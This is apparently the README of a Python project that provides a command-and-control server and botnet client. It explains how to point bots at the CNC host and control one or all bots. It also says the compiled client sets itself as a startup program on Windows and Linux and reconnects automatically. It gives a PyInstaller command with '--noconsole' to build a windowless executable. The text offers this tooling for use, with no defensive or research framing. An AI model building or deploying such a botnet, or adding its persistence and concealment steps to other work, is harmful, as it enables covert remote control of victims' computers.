# CNC-And-BotNet

# A CNC and BotNet Using python.

Change the host and port in the botnet.py to your cnc's server host and port.

You can connect multiple bots at same time and control a particular bot or all bots at the same time.

If you convert the botent into an executable then it will be set as a startup program for Windows and Linux OS.
  You can change the directory and name of the executable in the code at line 17-32.

If the CNC Server is not running then the bot will try to connect back every 25 seconds
  and If the server doesn't talk with the bot for more than 200 seconds then the bot will break the connection and try again.


# Use Pyinstaller to make the executable as follows
  pyinstaller --noconsole --onefile botnet.py
  There will be a executable in the dist folder

   You would require Wine if you want to make an exe file in Linux for Windows

